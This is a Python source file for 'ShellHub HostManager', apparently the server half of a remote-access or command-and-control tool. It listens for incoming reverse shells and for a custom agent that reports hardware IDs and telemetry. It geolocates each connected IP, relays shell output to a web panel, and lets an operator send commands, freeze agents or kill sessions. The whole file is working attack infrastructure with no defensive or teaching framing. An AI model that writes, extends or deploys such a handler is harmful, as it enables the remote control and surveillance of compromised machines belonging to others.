"""
ShellHub HostManager
Dual-mode: accepts both our binary-protocol agent AND any raw reverse shell
(bash, nc, python, socat, etc.) via automatic protocol detection.
"""
import socket
import threading
import uuid
import time
import json
import os
import struct
import select
import codecs
from datetime import datetime
import urllib.request
from typing import Optional, Dict, Any

# ──────────────────────────── Protocol (binary agent) ───────────────────
PTYPE_HANDSHAKE = 0
PTYPE_SHELL     = 1
PTYPE_CTRL      = 2
PTYPE_TELEMETRY = 3
HEADER_FMT      = ">BIB"
HEADER_SIZE     = struct.calcsize(HEADER_FMT)
READ_BUF        = 65536
DETECT_TIMEOUT  = 2.0   # seconds to wait for binary handshake peek


# ──────────────────────────── Helpers ───────────────────────────────────
def _send_frame(sock: socket.socket, ptype: int, data: bytes) -> bool:
    try:
        header = struct.pack(HEADER_FMT, ptype, len(data), 0)
        sock.sendall(header + data)
        return True
    except Exception:
        return False


def _set_keepalive(sock: socket.socket, idle: int = 10, interval: int = 5, count: int = 3):
    """Enable TCP keepalive so stale connections are detected quickly."""
    try:
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        if hasattr(socket, 'TCP_KEEPIDLE'):
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, idle)
        if hasattr(socket, 'TCP_KEEPINTVL'):
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, interval)
        if hasattr(socket, 'TCP_KEEPCNT'):
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPCNT, count)
    except Exception:
        pass


# ──────────────────────────── Manager ───────────────────────────────────
class HostManager:
    def __init__(self, host: str = "0.0.0.0", port: int = 7777):
        self.host = host
        self.port = port
        self.hosts: Dict[str, Any] = {}   # hwid → host context
        self.shell_map: Dict[str, str] = {}  # shell_id → hwid
        self.lock = threading.Lock()
        self.listener_socket: Optional[socket.socket] = None
        self.is_running = False
        self.socketio: Any = None

    def set_socketio(self, sio):
        self.socketio = sio

    # ── Listener ────────────────────────────────────────────────────────
    def start_listener(self, port=None) -> bool:
        if port:
            self.port = int(port)
        if self.is_running:
            self.stop_listener()
        print(f"[*] Iniciando escucha en {self.host}:{self.port}...")
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind((self.host, self.port))
            sock.listen(1024)
            self.listener_socket = sock
            self.is_running = True
            threading.Thread(target=self._accept_connections, daemon=True).start()
            print(f"[+] Escucha activa en puerto {self.port}")
            return True
        except Exception as e:
            print(f"[!] Error al iniciar escucha: {e}")
            return False

    def stop_listener(self):
        self.is_running = False
        if self.listener_socket:
            try: self.listener_socket.shutdown(socket.SHUT_RDWR)
            except Exception: pass
            try: self.listener_socket.close()
            except Exception: pass
        self.listener_socket = None
        print("[*] Escucha detenida.")

    def _accept_connections(self):
        while self.is_running:
            try:
                client, addr = self.listener_socket.accept()
                threading.Thread(
                    target=self._handle_new_connection,
                    args=(client, addr),
                    daemon=True,
                ).start()
            except Exception:
                if self.is_running:
                    time.sleep(0.5)

    # ── Protocol detection ───────────────────────────────────────────────
    def _detect_protocol(self, client: socket.socket) -> str:
        """
        Peek at first 6 bytes within DETECT_TIMEOUT seconds.
        Returns 'binary' if they match our frame header, 'raw' otherwise.
        """
        try:
            client.settimeout(DETECT_TIMEOUT)
            peek = client.recv(HEADER_SIZE, socket.MSG_PEEK)
            client.settimeout(None)
            if len(peek) == HEADER_SIZE:
                ptype, length, _ = struct.unpack(HEADER_FMT, peek)
                # Sanity-check: our agent sends PTYPE_HANDSHAKE (0) first,
                # with a JSON payload of 10–512 bytes.
                if ptype == PTYPE_HANDSHAKE and 10 <= length <= 512:
                    return 'binary'
        except Exception:
            pass
        try:
            client.settimeout(None)
        except Exception:
            pass
        return 'raw'

    # ── Connection entry point ───────────────────────────────────────────
    def _handle_new_connection(self, client: socket.socket, addr: tuple):
        _set_keepalive(client)
        client.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)

        mode = self._detect_protocol(client)
        print(f"[+] Conexión de {addr[0]}:{addr[1]} → modo={mode}")

        if mode == 'binary':
            self._start_binary_session(client, addr)
        else:
            self._start_raw_session(client, addr)

    # ── GEO (non-blocking) ───────────────────────────────────────────────
    def _geo_worker(self, ip: str, hwid: str):
        if ip in ('127.0.0.1', '::1'):
            geo = {'country': 'Localhost', 'countryCode': 'LO', 'city': 'Control Center'}
        else:
            try:
                url = f'http://ip-api.com/json/{ip}?fields=status,country,countryCode,city'
                with urllib.request.urlopen(url, timeout=5) as r:
                    d = json.loads(r.read().decode())
                    geo = d if d.get('status') == 'success' else \
                        {'country': 'Unknown', 'countryCode': 'UN', 'city': 'Unknown'}
            except Exception:
                geo = {'country': 'Unknown', 'countryCode': 'UN', 'city': 'Unknown'}
        with self.lock:
            if hwid in self.hosts:
                self.hosts[hwid]['geo'] = geo
        if self.socketio:
            self.socketio.emit('shell_list_update', self.get_shell_list(), namespace='/panel')

    # ════════════════════════ RAW MODE ══════════════════════════════════
    def _start_raw_session(self, client: socket.socket, addr: tuple):
        """
        Pure byte relay — no framing. Works with any reverse shell:
        bash, nc, python one-liners, socat, etc.
        """
        hwid = f"{addr[0]}:{addr[1]}"
        shell_id = str(uuid.uuid4())[:8]

        with self.lock:
            # If this IP has a stale offline slot, reuse its shell_id for
            # continuity (same browser tab can reconnect).
            for existing_hwid, h in self.hosts.items():
                if h['addr'][0] == addr[0] and not h.get('is_online'):
                    old_sock = h.get('socket')
                    if old_sock:
                        try: old_sock.close()
                        except Exception: pass
                    hwid = existing_hwid
                    shell_id = h['shell_id']
                    h.update({
                        'socket': client, 'addr': addr,
                        'is_online': True, 'connected_at': datetime.now(),
                        'mode': 'raw',
                        'sys_info': {'os': 'Unknown', 'distro': 'Raw Shell',
                                     'hwid': hwid, 'hostname': addr[0]},
                        'telemetry': {'cpu_usage': 0, 'ram_usage': 0},
                    })
                    print(f"[+] Reconexión raw para IP={addr[0]} → reutilizando HWID={hwid}")
                    break
            else:
                self.hosts[hwid] = {
                    'socket': client, 'addr': addr,
                    'shell_id': shell_id, 'connected_at': datetime.now(),
                    'mode': 'raw',
                    'geo': {'country': '...', 'countryCode': '..', 'city': '...'},
                    'sys_info': {'os': 'Unknown', 'distro': 'Raw Shell',
                                 'hwid': hwid, 'hostname': addr[0]},
                    'telemetry': {'cpu_usage': 0, 'ram_usage': 0},
                    'is_frozen': False, 'is_online': True,
                }
                self.shell_map[shell_id] = hwid

        threading.Thread(target=self._geo_worker, args=(addr[0], hwid), daemon=True).start()
        threading.Thread(target=self._read_raw, args=(hwid,), daemon=True).start()

        if self.socketio:
            self.socketio.emit('shell_list_update', self.get_shell_list(), namespace='/panel')

    def _read_raw(self, hwid: str):
        """
        Relay raw bytes from the reverse shell to the browser terminal.
        Uses an incremental UTF-8 decoder so ANSI escape sequences and
        multi-byte characters are never split mid-sequence.
        """
        with self.lock:
            host = self.hosts.get(hwid)
            if not host: return
            sock     = host['socket']
            shell_id = host['shell_id']

        decoder = codecs.getincrementaldecoder('utf-8')('replace')

        while True:
            try:
                chunk = sock.recv(READ_BUF)
                if not chunk:
                    break
                decoded = decoder.decode(chunk)
                if decoded and self.socketio:
                    self.socketio.emit(
                        'shell_output',
                        {'shell_id': shell_id, 'data': decoded},
                        room=shell_id, namespace='/shell',
                    )
            except Exception:
                break

        # Flush decoder remainder
        try:
            tail = decoder.decode(b'', final=True)
            if tail and self.socketio:
                self.socketio.emit('shell_output', {'shell_id': shell_id, 'data': tail},
                                   room=shell_id, namespace='/shell')
        except Exception:
            pass

        self._teardown_host(hwid)

    # ════════════════════════ BINARY MODE ═══════════════════════════════
    def _start_binary_session(self, client: socket.socket, addr: tuple):
        """Handle our custom binary-protocol agent."""
        try:
            client.settimeout(5.0)
            # Read handshake frame header
            raw = b""
            while len(raw) < HEADER_SIZE:
                chunk = client.recv(HEADER_SIZE - len(raw))
                if not chunk: client.close(); return
                raw += chunk

            ptype, length, _ = struct.unpack(HEADER_FMT, raw)
            payload_raw = b""
            while len(payload_raw) < length:
                chunk = client.recv(length - len(payload_raw))
                if not chunk: client.close(); return
                payload_raw += chunk

            client.settimeout(None)
            sysinfo = json.loads(payload_raw.decode('utf-8')) if ptype == PTYPE_HANDSHAKE \
                      else {'hwid': addr[0], 'os': 'Unknown', 'distro': 'Unknown',
                            'cpu': '', 'hostname': addr[0]}

            hwid = sysinfo.get('hwid', addr[0])

            with self.lock:
                existing = self.hosts.get(hwid)
                if existing:
                    old = existing.get('socket')
                    if old:
                        try: old.close()
                        except Exception: pass
                    existing.update({
                        'socket': client, 'addr': addr, 'is_online': True,
                        'connected_at': datetime.now(), 'mode': 'binary',
                        'sys_info': {
                            'os': sysinfo.get('os', '?'),
                            'distro': sysinfo.get('distro', '?'),
                            'cpu': sysinfo.get('cpu', ''),
                            'hwid': hwid,
                            'hostname': sysinfo.get('hostname', ''),
                        },
                    })
                    shell_id = existing['shell_id']
                    print(f"[+] Reconexión binaria HWID={hwid}")
                else:
                    shell_id = str(uuid.uuid4())[:8]
                    self.hosts[hwid] = {
                        'socket': client, 'addr': addr, 'shell_id': shell_id,
                        'connected_at': datetime.now(), 'mode': 'binary',
                        'geo': {'country': '...', 'countryCode': '..', 'city': '...'},
                        'sys_info': {
                            'os': sysinfo.get('os', '?'),
                            'distro': sysinfo.get('distro', '?'),
                            'cpu': sysinfo.get('cpu', ''),
                            'hwid': hwid,
                            'hostname': sysinfo.get('hostname', ''),
                        },
                        'telemetry': {'cpu_usage': 0, 'ram_usage': 0},
                        'is_frozen': False, 'is_online': True,
                    }
                    self.shell_map[shell_id] = hwid
                    print(f"[+] Nuevo agente binario HWID={hwid}")

            threading.Thread(target=self._geo_worker, args=(addr[0], hwid), daemon=True).start()
            threading.Thread(target=self._read_binary, args=(hwid,), daemon=True).start()

            if self.socketio:
                self.socketio.emit('shell_list_update', self.get_shell_list(), namespace='/panel')

        except Exception as e:
            print(f"[!] Error en sesión binaria: {e}")
            try: client.close()
            except Exception: pass

    def _read_binary(self, hwid: str):
        """Frame-based reader for our custom binary agent."""
        with self.lock:
            host = self.hosts.get(hwid)
            if not host: return
            sock     = host['socket']
            shell_id = host['shell_id']

        buf = b""
        while True:
            try:
                chunk = sock.recv(READ_BUF)
                if not chunk: break
                buf += chunk

                while len(buf) >= HEADER_SIZE:
                    ptype, length, _ = struct.unpack(HEADER_FMT, buf[:HEADER_SIZE])
                    if len(buf) < HEADER_SIZE + length: break
                    payload = buf[HEADER_SIZE: HEADER_SIZE + length]
                    buf = buf[HEADER_SIZE + length:]

                    if ptype == PTYPE_SHELL and self.socketio:
                        try: decoded = payload.decode('utf-8')
                        except UnicodeDecodeError: decoded = payload.decode('latin-1')
                        self.socketio.emit('shell_output', {'shell_id': shell_id, 'data': decoded},
                                           room=shell_id, namespace='/shell')

                    elif ptype == PTYPE_TELEMETRY:
                        try:
                            metrics = json.loads(payload.decode('utf-8', 'ignore'))
                            with self.lock:
                                if hwid in self.hosts:
                                    self.hosts[hwid]['telemetry'] = metrics
                            if self.socketio:
                                self.socketio.emit('shell_list_update', self.get_shell_list(),
                                                   namespace='/panel')
                        except Exception: pass

            except Exception: break

        self._teardown_host(hwid)

    # ── Teardown ─────────────────────────────────────────────────────────
    def _teardown_host(self, hwid: str):
        shell_id = None
        with self.lock:
            if hwid in self.hosts:
                self.hosts[hwid]['is_online'] = False
                shell_id = self.hosts[hwid]['shell_id']
        if shell_id and self.socketio:
            self.socketio.emit('shell_disconnected', {'shell_id': shell_id},
                               namespace='/shell')
            self.socketio.emit('shell_list_update', self.get_shell_list(), namespace='/panel')
        print(f"[-] Host desconectado: {hwid}")

    # ── Send input ────────────────────────────────────────────────────────
    def _resolve_hwid(self, identifier: str):
        if identifier in self.hosts:
            return identifier
        if identifier in self.shell_map:
            return self.shell_map[identifier]
        return None

    def send_input(self, identifier: str, data: str) -> bool:
        with self.lock:
            hwid = self._resolve_hwid(identifier)
            if hwid is None: return False
            host = self.hosts[hwid]

            # Master local shell (PTY fd)
            if hwid == 'MASTER':
                try:
                    os.write(host['pty_fd'], data.encode('utf-8'))
                    return True
                except OSError: return False

            if not host.get('is_online') or not host.get('socket'):
                return False

            # Raw shell: send bytes directly — no framing
            if host.get('mode') == 'raw':
                try:
                    host['socket'].sendall(data.encode('utf-8'))
                    return True
                except Exception: return False

            # Binary agent: wrap in PTYPE_SHELL frame
            return _send_frame(host['socket'], PTYPE_SHELL, data.encode('utf-8'))

    # ── Resize terminal ───────────────────────────────────────────────────
    def resize_terminal(self, identifier: str, cols: int, rows: int) -> bool:
        with self.lock:
            hwid = self._resolve_hwid(identifier)
            if hwid is None: return False
            host = self.hosts[hwid]

            if hwid == 'MASTER':
                try:
                    import fcntl, termios
                    ws = struct.pack('HHHH', rows, cols, 0, 0)
                    fcntl.ioctl(host['pty_fd'], termios.TIOCSWINSZ, ws)
                    return True
                except Exception: return False

            if host.get('mode') == 'raw':
                # For raw shells we can't do ioctl — send stty silently via
                # a special invisible escape. We skip it here; the PTY upgrade
                # button in the terminal sends stty after pty.spawn().
                return False

            # Binary agent: send CTRL resize frame
            if host.get('is_online') and host.get('socket'):
                payload = json.dumps({'type': 'resize', 'cols': cols, 'rows': rows}).encode()
                return _send_frame(host['socket'], PTYPE_CTRL, payload)
        return False

    # ── Freeze (binary only) ──────────────────────────────────────────────
    def toggle_freeze(self, identifier: str) -> bool:
        with self.lock:
            hwid = self._resolve_hwid(identifier)
            if not hwid or hwid not in self.hosts: return False
            host = self.hosts[hwid]
            if host.get('mode') == 'raw': return False
            new_state = not host.get('is_frozen', False)
            host['is_frozen'] = new_state
            if host.get('is_online') and host.get('socket'):
                payload = json.dumps({'type': 'freeze', 'state': new_state}).encode()
                _send_frame(host['socket'], PTYPE_CTRL, payload)
            return new_state

    # ── Kill ──────────────────────────────────────────────────────────────
    def kill_host(self, identifier: str) -> bool:
        with self.lock:
            hwid = self._resolve_hwid(identifier)
            if not hwid or hwid not in self.hosts: return False
            host = self.hosts[hwid]

            if hwid == 'MASTER':
                proc = host.get('process')
                if proc:
                    try: proc.terminate()
                    except Exception: pass
                host['is_online'] = False
                return True

            sock = host.get('socket')
            if sock:
                if host.get('mode') == 'binary':
                    try: _send_frame(sock, PTYPE_CTRL, json.dumps({'type': 'kill'}).encode())
                    except Exception: pass
                try: sock.close()
                except Exception: pass
            host['is_online'] = False
            host['socket'] = None

        if self.socketio:
            self.socketio.emit('shell_list_update', self.get_shell_list(), namespace='/panel')
        return True

    # ── Master local shell ────────────────────────────────────────────────
    def start_master_shell(self) -> str:
        hwid, shell_id = 'MASTER', 'MASTER'
        with self.lock:
            existing = self.hosts.get(hwid)
            if existing and existing.get('is_online'):
                return shell_id

        import pty as _pty, subprocess
        master_fd, slave_fd = _pty.openpty()
        env = os.environ.copy()
        env['TERM'] = 'xterm-256color'
        env['LANG'] = 'en_US.UTF-8'
        env['LC_ALL'] = 'en_US.UTF-8'
        proc = subprocess.Popen(
            ['/bin/bash', '-l'],
            stdin=slave_fd, stdout=slave_fd, stderr=slave_fd,
            preexec_fn=os.setsid, env=env,
        )
        os.close(slave_fd)

        with self.lock:
            self.hosts[hwid] = {
                'socket': None, 'pty_fd': master_fd, 'process': proc,
                'addr': ('127.0.0.1', 0), 'shell_id': shell_id,
                'connected_at': datetime.now(), 'mode': 'master', 'is_online': True,
                'geo': {'country': 'Localhost', 'countryCode': 'LO', 'city': 'Control Center'},
                'sys_info': {'os': 'Linux', 'distro': 'Local Host', 'hwid': 'MASTER'},
                'telemetry': {'cpu_usage': 0, 'ram_usage': 0},
            }
            self.shell_map[shell_id] = hwid

        def _read_master():
            decoder = codecs.getincrementaldecoder('utf-8')('replace')
            while True:
                try:
                    ready, _, _ = select.select([master_fd], [], [], 1.0)
                    if not ready:
                        if proc.poll() is not None: break
                        continue
                    data = os.read(master_fd, READ_BUF)
                    if not data: break
                    decoded = decoder.decode(data)
                    if decoded and self.socketio:
                        self.socketio.emit('shell_output', {'shell_id': shell_id, 'data': decoded},
                                           room=shell_id, namespace='/shell')
                except OSError: break
            self._teardown_host(hwid)

        threading.Thread(target=_read_master, daemon=True).start()
        return shell_id

    # ── List ──────────────────────────────────────────────────────────────
    def get_shell_list(self) -> list:
        with self.lock:
            return [{
                'id'          : hwid,
                'shell_id'    : h.get('shell_id'),
                'addr'        : h['addr'][0],
                'port'        : h['addr'][1],
                'connected_at': h['connected_at'].strftime('%H:%M:%S'),
                'geo'         : h.get('geo', {}),
                'sys_info'    : h.get('sys_info', {}),
                'telemetry'   : h.get('telemetry', {'cpu_usage': 0, 'ram_usage': 0}),
                'is_frozen'   : h.get('is_frozen', False),
                'is_online'   : h.get('is_online', False),
                'mode'        : h.get('mode', 'raw'),
            } for hwid, h in self.hosts.items()]


host_manager = HostManager()
